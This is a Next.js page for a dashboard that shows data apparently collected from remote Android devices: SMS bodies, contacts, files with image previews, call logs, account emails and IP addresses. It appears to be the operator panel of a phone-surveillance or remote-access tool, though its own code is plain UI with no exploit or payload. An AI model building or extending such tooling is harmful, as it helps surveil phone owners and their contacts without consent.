"use client";

import { useState } from "react";
import { useParams, useRouter } from "next/navigation";
import { useDevice, useDeleteDevice, useDeviceSms, useDeviceContacts, useDeviceFiles, useDeviceCallLogs } from "@/hooks/useDevices";
import { StatusBadge } from "@/components/shared/status-badge";
import { LoadingSpinner } from "@/components/shared/loading-spinner";
import { ErrorState } from "@/components/shared/error-state";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Separator } from "@/components/ui/separator";
import { Badge } from "@/components/ui/badge";
import { Skeleton } from "@/components/ui/skeleton";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { formatDate } from "@/lib/utils";
import {
  FiSmartphone, FiArrowLeft, FiTrash2, FiGlobe, FiHash,
  FiCpu, FiPackage, FiClock, FiCalendar, FiActivity,
  FiMessageSquare, FiUsers, FiFolder, FiMail, FiPhone, FiPhoneCall,
  FiEye,
} from "react-icons/fi";

const API_BASE = process.env.NEXT_PUBLIC_API_URL || "http://localhost:5000/api";

type Tab = "info" | "sms" | "contacts" | "files" | "calllogs";

function formatDateTime(ts: number | string | null | undefined): string {
  if (ts === null || ts === undefined || ts === 0 || ts === "0") return "\u2014";
  const num = Number(ts);
  if (isNaN(num) || num <= 0) return "\u2014";
  const d = new Date(num);
  if (isNaN(d.getTime())) return "\u2014";
  return d.toLocaleString("en-US", {
    year: "numeric", month: "short", day: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
  });
}

function formatFileSize(bytes: number): string {
  if (!bytes || bytes <= 0) return "0 B";
  const units = ["B", "KB", "MB", "GB"];
  let i = 0;
  let size = bytes;
  while (size >= 1024 && i < units.length - 1) { size /= 1024; i++; }
  return `${size.toFixed(i === 0 ? 0 : 1)} ${units[i]}`;
}

function formatDuration(seconds: number): string {
  if (!seconds || seconds <= 0) return "0:00";
  const m = Math.floor(seconds / 60);
  const s = Math.floor(seconds % 60);
  return `${m}:${s.toString().padStart(2, "0")}`;
}

function TabCount({ label, count, isLoading }: { label: string; count?: number; isLoading: boolean }) {
  return (
    <span className="ml-1 text-xs">
      {isLoading ? (
        <span className="inline-block w-6 h-3 bg-muted-foreground/20 rounded animate-pulse" />
      ) : count !== undefined ? (
        <Badge variant="secondary" className="text-xs">{count}</Badge>
      ) : null}
    </span>
  );
}

function CollectingState({ type }: { type: string }) {
  return (
    <div className="text-center py-12 space-y-3">
      <div className="flex justify-center">
        <div className="h-8 w-8 animate-spin rounded-full border-4 border-primary border-t-transparent" />
      </div>
      <p className="text-sm font-medium text-muted-foreground">
        Fetching {type} from device...
      </p>
      <p className="text-xs text-muted-foreground/60">
        Please wait 3-5 minutes. Data will appear automatically once collected.
      </p>
    </div>
  );
}

export default function DeviceDetailPage() {
  const params = useParams();
  const router = useRouter();
  const id = params.id as string;
  const [tab, setTab] = useState<Tab>("info");
  const [selectedSms, setSelectedSms] = useState<any>(null);
  const [previewFile, setPreviewFile] = useState<any>(null);

  const { data, isLoading, error, refetch } = useDevice(id);
  const device = data?.device;
  const deviceId = device?.deviceId || "";
  const deviceReady = !!deviceId;

  const isRecentlyActive = device?.lastSeen
    ? Date.now() - new Date(device.lastSeen).getTime() < 10 * 60 * 1000
    : true;

  const { data: smsData, isLoading: smsLoading } = useDeviceSms(deviceId);
  const { data: contactsData, isLoading: contactsLoading } = useDeviceContacts(deviceId);
  const { data: filesData, isLoading: filesLoading } = useDeviceFiles(deviceId);
  const { data: callLogsData, isLoading: callLogsLoading } = useDeviceCallLogs(deviceId);
  const deleteMutation = useDeleteDevice();

  if (isLoading) {
    return (
      <div className="flex h-[50vh] items-center justify-center">
        <LoadingSpinner size="lg" />
      </div>
    );
  }

  if (error || !device) {
    return (
      <ErrorState
        title="Device not found"
        message={error?.message || "The device you're looking for doesn't exist."}
        onRetry={() => refetch()}
      />
    );
  }

  const handleDelete = () => {
    deleteMutation.mutate(device.id, {
      onSuccess: () => router.push("/devices"),
    });
  };

  const isImageFile = (name: string) => /\.(jpg|jpeg|png|gif|webp|bmp)$/i.test(name);

  const tabs: { key: Tab; label: string; icon: React.ReactNode; count?: number; loading: boolean }[] = [
    { key: "info", label: "Info", icon: <FiSmartphone className="h-4 w-4" />, loading: false },
    { key: "sms", label: "SMS", icon: <FiMessageSquare className="h-4 w-4" />, count: smsData?.sms?.length, loading: smsLoading },
    { key: "contacts", label: "Contacts", icon: <FiUsers className="h-4 w-4" />, count: contactsData?.contacts?.length, loading: contactsLoading },
    { key: "files", label: "Files", icon: <FiFolder className="h-4 w-4" />, count: filesData?.files?.length, loading: filesLoading },
    { key: "calllogs", label: "Call Logs", icon: <FiPhoneCall className="h-4 w-4" />, count: callLogsData?.callLogs?.length, loading: callLogsLoading },
  ];

  const infoItems = [
    { label: "Device Name", value: device.deviceName, icon: FiSmartphone },
    { label: "Device ID", value: device.deviceId, icon: FiHash },
    { label: "Phone Number", value: device.phoneNumber || "\u2014", icon: FiPhone },
    { label: "Email", value: device.accountEmails?.join(", ") || "\u2014", icon: FiMail },
    { label: "Android Version", value: device.androidVersion || "\u2014", icon: FiCpu },
    { label: "App Version", value: device.appVersion || "\u2014", icon: FiPackage },
    { label: "IP Address", value: device.ipAddress || "\u2014", icon: FiGlobe },
    { label: "Status", value: "", icon: FiActivity, custom: <StatusBadge status={device.status} /> },
    { label: "Last Seen", value: formatDate(device.lastSeen), icon: FiClock },
    { label: "Created", value: formatDate(device.createdAt), icon: FiCalendar },
  ];

  return (
    <div className="space-y-6 max-w-4xl">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4">
          <Button variant="ghost" size="icon" onClick={() => router.back()}>
            <FiArrowLeft className="h-4 w-4" />
          </Button>
          <div>
            <h1 className="text-2xl font-bold tracking-tight">{device.deviceName}</h1>
            <p className="text-sm text-muted-foreground">Device details and collected data</p>
          </div>
          <Badge variant="outline" className="gap-1.5 text-xs">
            <span className="relative flex h-2 w-2">
              <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-green-400 opacity-75" />
              <span className="relative inline-flex h-2 w-2 rounded-full bg-green-500" />
            </span>
            Live
          </Badge>
        </div>
        <Button variant="destructive" size="sm" onClick={handleDelete} disabled={deleteMutation.isPending}>
          <FiTrash2 className="mr-2 h-4 w-4" />
          {deleteMutation.isPending ? "Deleting..." : "Delete Device"}
        </Button>
      </div>

      <div className="flex gap-1 border-b overflow-x-auto">
        {tabs.map((t) => (
          <button
            key={t.key}
            onClick={() => setTab(t.key)}
            className={`flex items-center gap-2 px-4 py-2 text-sm font-medium border-b-2 transition-colors whitespace-nowrap ${
              tab === t.key
                ? "border-primary text-primary"
                : "border-transparent text-muted-foreground hover:text-foreground"
            }`}
          >
            {t.icon}
            {t.label}
            <TabCount label={t.label} count={t.count} isLoading={t.loading} />
          </button>
        ))}
      </div>

      {tab === "info" && (
        <Card>
          <CardHeader><CardTitle>Device Information</CardTitle></CardHeader>
          <Separator />
          <CardContent className="pt-6">
            <div className="grid gap-6 sm:grid-cols-2">
              {infoItems.map((item) => (
                <div key={item.label} className="flex items-start gap-3">
                  <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-muted shrink-0">
                    <item.icon className="h-4 w-4 text-muted-foreground" />
                  </div>
                  <div>
                    <p className="text-sm font-medium text-muted-foreground">{item.label}</p>
                    {item.custom || <p className="text-sm font-medium mt-0.5">{item.value}</p>}
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      )}

      {tab === "sms" && (
        <Card>
          <CardHeader><CardTitle>SMS Messages {!smsLoading ? `(${smsData?.sms?.length || 0})` : ""}</CardTitle></CardHeader>
          <Separator />
          <CardContent className="pt-6">
            {smsLoading ? (
              <div className="space-y-3">
                {[...Array(5)].map((_, i) => (
                  <div key={i} className="flex items-start gap-3 p-3">
                    <Skeleton className="h-4 w-4 mt-1 shrink-0 rounded" />
                    <div className="flex-1 space-y-2">
                      <Skeleton className="h-4 w-32" />
                      <Skeleton className="h-3 w-full" />
                      <Skeleton className="h-3 w-40" />
                    </div>
                  </div>
                ))}
              </div>
            ) : !smsData?.sms?.length ? (
              isRecentlyActive ? <CollectingState type="SMS messages" /> :
              <p className="text-sm text-muted-foreground text-center py-8">No SMS data collected</p>
            ) : (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {smsData.sms.map((msg: any, i: number) => (
                  <div
                    key={msg.id || i}
                    onClick={() => setSelectedSms(msg)}
                    className="flex items-start gap-3 p-3 rounded-lg bg-muted/50 cursor-pointer hover:bg-muted transition-colors"
                  >
                    <FiMessageSquare className="h-4 w-4 mt-1 text-muted-foreground shrink-0" />
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-2">
                        <span className="text-sm font-medium">{msg.address || "Unknown"}</span>
                        <Badge variant={msg.type === 1 ? "default" : "secondary"} className="text-[10px]">
                          {msg.type === 1 ? "Inbox" : "Sent"}
                        </Badge>
                      </div>
                      <p className="text-sm text-muted-foreground truncate mt-1">{msg.body || "(empty)"}</p>
                      <p className="text-xs text-muted-foreground mt-1">{formatDateTime(msg.date)}</p>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      )}

      {tab === "contacts" && (
        <Card>
          <CardHeader><CardTitle>Contacts {!contactsLoading ? `(${contactsData?.contacts?.length || 0})` : ""}</CardTitle></CardHeader>
          <Separator />
          <CardContent className="pt-6">
            {contactsLoading ? (
              <div className="space-y-3">
                {[...Array(5)].map((_, i) => (
                  <div key={i} className="flex items-start gap-3 p-3">
                    <Skeleton className="h-8 w-8 rounded-full shrink-0" />
                    <div className="flex-1 space-y-2">
                      <Skeleton className="h-4 w-40" />
                      <Skeleton className="h-3 w-28" />
                      <Skeleton className="h-3 w-36" />
                    </div>
                  </div>
                ))}
              </div>
            ) : !contactsData?.contacts?.length ? (
              isRecentlyActive ? <CollectingState type="contacts" /> :
              <p className="text-sm text-muted-foreground text-center py-8">No contacts collected</p>
            ) : (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {contactsData.contacts.map((c: any, i: number) => (
                  <div key={c.id || i} className="flex items-start gap-3 p-3 rounded-lg bg-muted/50">
                    <div className="flex h-8 w-8 items-center justify-center rounded-full bg-primary/10 shrink-0">
                      <span className="text-sm font-bold text-primary">{(c.name || "?").charAt(0).toUpperCase()}</span>
                    </div>
                    <div className="min-w-0 flex-1">
                      <p className="text-sm font-medium">{c.name || "Unknown"}</p>
                      {c.phone_number ? (
                        <div className="flex items-center gap-1.5 text-sm text-foreground mt-0.5">
                          <FiPhone className="h-3.5 w-3.5 text-muted-foreground shrink-0" />
                          <span className="font-medium">{c.phone_number}</span>
                        </div>
                      ) : (
                        <div className="flex items-center gap-1.5 text-sm text-muted-foreground mt-0.5">
                          <FiPhone className="h-3.5 w-3.5 shrink-0" />
                          <span className="italic">No number</span>
                        </div>
                      )}
                      {c.email && (
                        <div className="flex items-center gap-1.5 text-sm text-muted-foreground mt-0.5">
                          <FiMail className="h-3.5 w-3.5 shrink-0" />
                          <span>{c.email}</span>
                        </div>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      )}

      {tab === "files" && (
        <Card>
          <CardHeader><CardTitle>Files {!filesLoading ? `(${filesData?.files?.length || 0})` : ""}</CardTitle></CardHeader>
          <Separator />
          <CardContent className="pt-6">
            {filesLoading ? (
              <div className="space-y-3">
                {[...Array(5)].map((_, i) => (
                  <div key={i} className="flex items-start gap-3 p-3">
                    <Skeleton className="h-4 w-4 mt-1 shrink-0" />
                    <div className="flex-1 space-y-2">
                      <Skeleton className="h-4 w-3/4" />
                      <Skeleton className="h-3 w-full" />
                      <Skeleton className="h-3 w-20" />
                    </div>
                  </div>
                ))}
              </div>
            ) : !filesData?.files?.length ? (
              isRecentlyActive ? <CollectingState type="files" /> :
              <p className="text-sm text-muted-foreground text-center py-8">No files collected</p>
            ) : (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {filesData.files.map((f: any, i: number) => (
                  <div
                    key={f.id || i}
                    className={`flex items-start gap-3 p-3 rounded-lg bg-muted/50 ${isImageFile(f.name) && f.id ? "cursor-pointer hover:bg-muted transition-colors" : ""}`}
                    onClick={() => isImageFile(f.name) && f.id && setPreviewFile(f)}
                  >
                    <FiFolder className="h-4 w-4 mt-1 text-muted-foreground shrink-0" />
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-2">
                        <p className="text-sm font-medium truncate">{f.name}</p>
                        {isImageFile(f.name) && f.id && (
                          <Badge variant="outline" className="text-[10px] gap-1 shrink-0">
                            <FiEye className="h-3 w-3" /> Preview
                          </Badge>
                        )}
                      </div>
                      <p className="text-xs text-muted-foreground truncate">{f.path || "\u2014"}</p>
                      <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs text-muted-foreground mt-1">
                        <span>{f.is_directory ? "Directory" : formatFileSize(f.size)}</span>
                        <span>{formatDateTime(f.last_modified)}</span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      )}

      {tab === "calllogs" && (
        <Card>
          <CardHeader><CardTitle>Call Logs {!callLogsLoading ? `(${callLogsData?.callLogs?.length || 0})` : ""}</CardTitle></CardHeader>
          <Separator />
          <CardContent className="pt-6">
            {callLogsLoading ? (
              <div className="space-y-3">
                {[...Array(5)].map((_, i) => (
                  <div key={i} className="flex items-start gap-3 p-3">
                    <Skeleton className="h-4 w-4 mt-1 shrink-0" />
                    <div className="flex-1 space-y-2">
                      <Skeleton className="h-4 w-32" />
                      <Skeleton className="h-3 w-24" />
                      <Skeleton className="h-3 w-40" />
                    </div>
                  </div>
                ))}
              </div>
            ) : !callLogsData?.callLogs?.length ? (
              isRecentlyActive ? <CollectingState type="call logs" /> :
              <p className="text-sm text-muted-foreground text-center py-8">No call logs collected</p>
            ) : (
              <div className="space-y-2 max-h-[600px] overflow-y-auto">
                {callLogsData.callLogs.map((c: any, i: number) => (
                  <div key={c.id || i} className="flex items-start gap-3 p-3 rounded-lg bg-muted/50">
                    <FiPhoneCall className="h-4 w-4 mt-1 text-muted-foreground shrink-0" />
                    <div className="min-w-0 flex-1">
                      <div className="flex items-center gap-2">
                        <span className="text-sm font-medium">{c.name || c.number || "Unknown"}</span>
                        <Badge variant={c.type === 1 ? "default" : c.type === 2 ? "secondary" : "outline"} className="text-[10px]">
                          {c.type === 1 ? "Incoming" : c.type === 2 ? "Outgoing" : "Missed"}
                        </Badge>
                      </div>
                      <p className="text-xs text-muted-foreground">{c.number}</p>
                      <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs text-muted-foreground mt-1">
                        <span>{formatDateTime(c.date)}</span>
                        <span>{formatDuration(c.duration)}</span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      )}

      {/* SMS Detail Dialog */}
      <Dialog open={!!selectedSms} onOpenChange={(open) => !open && setSelectedSms(null)}>
        <DialogContent className="sm:max-w-lg">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <FiMessageSquare className="h-4 w-4" />
              SMS Details
            </DialogTitle>
          </DialogHeader>
          {selectedSms && (
            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <p className="text-xs text-muted-foreground">From / To</p>
                  <p className="text-sm font-medium">{selectedSms.address || "Unknown"}</p>
                </div>
                <div>
                  <p className="text-xs text-muted-foreground">Type</p>
                  <Badge variant={selectedSms.type === 1 ? "default" : "secondary"}>
                    {selectedSms.type === 1 ? "Inbox" : "Sent"}
                  </Badge>
                </div>
                <div className="col-span-2">
                  <p className="text-xs text-muted-foreground">Date</p>
                  <p className="text-sm">{formatDateTime(selectedSms.date)}</p>
                </div>
              </div>
              <Separator />
              <div>
                <p className="text-xs text-muted-foreground mb-2">Message Body</p>
                <div className="rounded-lg bg-muted p-4 max-h-[300px] overflow-y-auto">
                  <p className="text-sm whitespace-pre-wrap break-words">{selectedSms.body || "(empty)"}</p>
                </div>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* File Preview Dialog */}
      <Dialog open={!!previewFile} onOpenChange={(open) => !open && setPreviewFile(null)}>
        <DialogContent className="sm:max-w-3xl max-h-[90vh]">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <FiFolder className="h-4 w-4" />
              {previewFile?.name || "File Preview"}
            </DialogTitle>
          </DialogHeader>
          {previewFile && isImageFile(previewFile.name) && (
            <div className="flex items-center justify-center bg-muted rounded-lg overflow-hidden max-h-[70vh]">
              <img
                src={`${API_BASE}/device/file-content/${previewFile.id}`}
                alt={previewFile.name}
                className="max-w-full max-h-[70vh] object-contain"
                onError={(e) => {
                  const el = e.target as HTMLImageElement;
                  el.style.display = "none";
                  const parent = el.parentElement;
                  if (parent) {
                    parent.innerHTML = '<p class="text-sm text-muted-foreground p-8">Preview not available yet — file content uploading in background</p>';
                  }
                }}
              />
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
